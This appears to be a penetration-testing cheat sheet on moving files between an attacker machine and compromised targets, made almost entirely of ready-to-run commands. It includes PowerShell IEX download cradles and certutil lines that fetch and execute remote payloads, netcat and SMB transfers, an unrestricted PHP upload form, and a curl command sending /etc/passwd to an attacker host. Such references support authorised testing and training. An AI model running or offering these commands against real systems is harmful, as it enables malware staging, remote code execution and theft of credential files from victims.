# File Transfer Techniques

Methods for moving files between attacker and target machines.

---

## HTTP Server (Attacker â†’ Target)

### Python HTTP Server
```bash
# On attacker
python3 -m http.server 80
python -m SimpleHTTPServer 80  # Python 2
```

### Download on Linux Target
```bash
wget http://<attacker>/file
curl http://<attacker>/file -o file
```

### Download on Windows Target
```powershell
# PowerShell
Invoke-WebRequest -Uri http://<attacker>/file -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://<attacker>/file','C:\file.exe')
iwr http://<attacker>/file -o file.exe

# Certutil
certutil -urlcache -split -f http://<attacker>/file file.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://<attacker>/file C:\file.exe
```

---

## Netcat File Transfer

### Attacker to Target
```bash
# On target (receiver)
nc -lvnp 4444 > file

# On attacker (sender)
nc -w 3 <target> 4444 < file
```

### Target to Attacker
```bash
# On attacker (receiver)
nc -lvnp 4444 > file

# On target (sender)
nc -w 3 <attacker> 4444 < file
```

---

## SCP (When SSH Available)

```bash
# Copy to target
scp file user@<target>:/path/

# Copy from target
scp user@<target>:/path/file ./

# Recursive
scp -r folder user@<target>:/path/
```

---

## SMB Server

### Attacker Setup (Impacket)
```bash
impacket-smbserver share $(pwd) -smb2support
# or with authentication
impacket-smbserver share $(pwd) -smb2support -user test -password test
```

### Windows Target Download
```cmd
copy \\<attacker>\share\file C:\file

# With credentials
net use \\<attacker>\share /user:test test
copy \\<attacker>\share\file C:\file
```

---

## Base64 Encoding (Small Files)

### Linux to Linux
```bash
# On source
base64 file > file.b64
cat file.b64  # Copy output

# On target
echo "<base64_content>" | base64 -d > file
```

### Windows
```powershell
# Encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe"))

# Decode
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("<base64>"))
```

---

## FTP

### Attacker Setup
```bash
python3 -m pyftpdlib -p 21 -w
```

### Linux Target
```bash
ftp <attacker>
# anonymous login
get file
```

### Windows Target
```cmd
echo open <attacker> 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

---

## PHP Download

```php
<?php
file_put_contents("file", file_get_contents("http://<attacker>/file"));
?>
```

---

## Windows Specific

### PowerShell Download Cradles
```powershell
# Basic
IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')

# IWR
IEX(IWR http://<attacker>/script.ps1 -UseBasicParsing)

# Hidden file download
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/file','C:\Windows\Temp\file.exe')"
```

### Certutil (Built-in)
```cmd
certutil -urlcache -split -f http://<attacker>/file file
certutil -urlcache -split -f http://<attacker>/file file & file.exe
```

---

## Upload from Target

### PHP Upload Form
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file"><input type="submit">
</form>
```

### Python Upload Server
```bash
# Using uploadserver module
pip install uploadserver
python3 -m uploadserver 8080
```

### Curl Upload
```bash
curl -X POST http://<attacker>:8080/upload -F 'files=@/etc/passwd'
```

---

## Quick Reference

| Method | Attacker Command | Target Command |
|:-------|:-----------------|:---------------|
| HTTP | `python3 -m http.server 80` | `wget http://IP/file` |
| SMB | `impacket-smbserver share . -smb2support` | `copy \\IP\share\file` |
| NC | `nc -lvnp 4444 < file` | `nc IP 4444 > file` |
